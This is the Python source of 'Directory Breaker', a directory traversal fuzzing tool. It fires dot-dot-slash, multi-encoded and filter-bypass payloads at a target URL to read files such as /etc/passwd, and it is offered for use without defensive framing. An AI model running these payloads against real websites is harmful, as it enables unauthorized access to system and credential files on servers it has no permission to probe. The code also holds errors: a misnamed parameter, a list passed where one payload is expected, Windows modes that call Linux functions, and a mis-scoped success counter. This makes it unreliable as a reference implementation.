# ------------------------------------------------------------------------------
# MIT License
# Copyright (c) 2024, LOckETHQC
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files.
#
# This file is part of LOck-ethqc Github Repository Directory-Breaker
# ------------------------------------------------------------------------------
import argparse
import requests
import sys
from colorama import init, Fore, Style


################################################## LINUX SYSTEMS ###################################################################
def fuzz(url, file, dot, suffix):
    if suffix:
        print(f'{Style.BRIGHT}{Fore.BLUE}[S] Payload Sample: {url + dot + file + suffix}')
        #The spam payloads
        dotdot = ''
        file = file + suffix
        for i in range(0, 10):
            payload = dotdot + file
            dotdot += dot
            response = requests.get(url + payload)
            C = 0
            if response.status_code == 200:
                print(f'{Style.BRIGHT}{Fore.GREEN}[+] WEBSITE VULNERABLE TO: {url + payload}')
                C += 1
        if C == 0:
            print(f'{Style.BRIGHT}{Fore.RED}[x] PAYLOAD FAILED: {url + dot + file}')
    else:        
        print(f'{Style.BRIGHT}{Fore.BLUE}[S] Payload Sample: {url + dot + file}')
        #The spam payloads
        dotdot = ''
        for i in range(0, 10):
            payload = dotdot + file
            dotdot += dot
            response = requests.get(url + payload)
            C = 0
            if response.status_code == 200:
                print(f'{Style.BRIGHT}{Fore.GREEN}[+] WEBSITE VULNERABLE TO: {url + payload}')
                C += 1
        if C == 0:
            print(f'{Style.BRIGHT}{Fore.RED}[x] PAYLOAD FAILED: {url + dot + file}')

             

def basic_linux(url, file, suffix):
    dot = '../'
    fuzz(url, file, dot, suffix)

def url_encoding_mixer_linux(url, file, suffix):
    dot_payload = ['.', '%2e', '%252e', '%c0%2e', '%uff0e', '%e0%40%ae', '%c0%ae']
    slash_payload = ['/', '%2f', '%252f', '%uff0e', '%c0%af', '%e0%80%af', '%c0%2f']
    for i in dot_payload:
        for j in slash_payload:
            dot = i + i + j
            fuzz(url, file, dot, suffix)

def bypass_techniques_mixer_linux(url, file, suffix):
    dot_payload = ['....//', '..././', '..\\/', '..%c0%af', '..;/']
    for i in dot_payload:
        dot = i
        fuzz(url, file, dot, suffix)


################################################## WINDOWS SYSTEMS ###################################################################
def basic_win(url, file, suffic):
    dot = '..\\'
    fuzz(url, file, dot, suffix)

def url_encoding_mixer_win(url, file, suffix):
    dot_payload = ['.', '%2e', '%252e', '%c0%2e', '%uff0e', '%e0%40%ae', '%c0%ae']
    slash_payload = ['\\', '%5c', '%255c', '%c0%5c', '%c0%80%5c', '%u2216']
    for i in dot_payload:
        for j in slash_payload:
            dot = i + i + j
            fuzz(url, file, dot, suffix)

def bypass_techniques_mixer_win(url, file, suffix):
    dot = ['...\\\\', '...\\.\\', '..\\/', '..%c1%9c', '..;\\']
    for i in dot:
        fuzz(url, file, dot, suffix)


def main():
    parser = argparse.ArgumentParser(description='''Directory Breaker is a Directory Traversal Fuzzing Tool.
                                                    Checks whether a website is vulnerable to dot-dot-slash.
                                                    Simple Example usage of the tool:-
                                                    1) Direct Traverse: "python directbreaker.py -u http://example.com/ -f /etc/passwd"
                                                    2) Query Parameter Traverse: "python directbreaker.py -u http://example.com/?file= -f /etc/passwd"''')
    
    parser.add_argument('-u', type=str, help='Target URL.')
    parser.add_argument('-f', type=str, help='File Path Traversal')
    parser.add_argument('-s', type=str, default=None, help='File Path Suffix')
    parser.add_argument('-a', type=int, help='''Payload Types:
                                                1) Basic Linux-Based Payload
                                                2) URL-Encoded Mix Linux-Based Payload
                                                3) Bypass Techniques Linux-Based Payload
                                                4) All Variations of Linux-Based Payloads
                                                5) Basic Windows-Based Payload
                                                6) URL-Encoded Mix Windows-Based Payload
                                                7) Bypass Techniques Windows-Based Payload
                                                8) All Variants of Windows-Based Payloads
                                                9) All-Out Rage Attack! (Linux & Windows Payloads)''')
    args = parser.parse_args()
    url = args.u
    file = args.f
    suffix = args.s
    attack_type = args.a

    init(autoreset=True)

#Attack Launching!!!
    if attack_type == 1:
        basic_linux(url, file, suffix)
    elif attack_type == 2:
        url_encoding_mixer_linux(url, file, suffix)
    elif attack_type == 3:
        bypass_techniques_mixer_linux(url, file, suffix)
    elif attack_type == 4:
        basic_linux(url, file, suffix)
        url_encoding_mixer_linux(url, file, suffix)
        bypass_techniques_mixer_linux(url, file, suffix)

    elif attack_type == 5:
        basic_win(url, file, suffix)
    elif attack_type == 6:
        url_encoding_mixer_win(url, file, suffix)
    elif attack_type == 7:
        bypass_techniques_mixer_linux(url, file, suffix)
    elif attack_type == 8:
        basic_win(url, file, suffix)
        url_encoding_mixer_win(url, file, suffix)
        bypass_techniques_mixer_linux(url, file, suffix)

    elif attack_type == 9:
        basic_linux(url, file, suffix)
        url_encoding_mixer_linux(url, file, suffix)
        bypass_techniques_mixer_linux(url, file, suffix)
        basic_win(url, file, suffix)
        url_encoding_mixer_win(url, file, suffix)
        bypass_techniques_mixer_linux(url, file, suffix)
    else:
        print(f'{Style.BRIGHT}{Fore.RED}[-] Invalid Type of Attack!')
        sys.exit()
        
if __name__ == '__main__':

    print(r'''  ___  _            _                  ___              _           
 |   \(_)_ _ ___ __| |_ ___ _ _ _  _  | _ )_ _ ___ __ _| |_____ _ _ 
 | |) | | '_/ -_) _|  _/ _ \ '_| || | | _ \ '_/ -_) _` | / / -_) '_|
 |___/|_|_| \___\__|\__\___/_|  \_, | |___/_| \___\__,_|_\_\___|_|  
                                |__/                                ''')
    print('Directory Traversal Fuzzing Tool\nVersion 1.0.0 \nCreated By Abdulmalik "@LOckETHQC" Al-Kaisi\n')

    main()
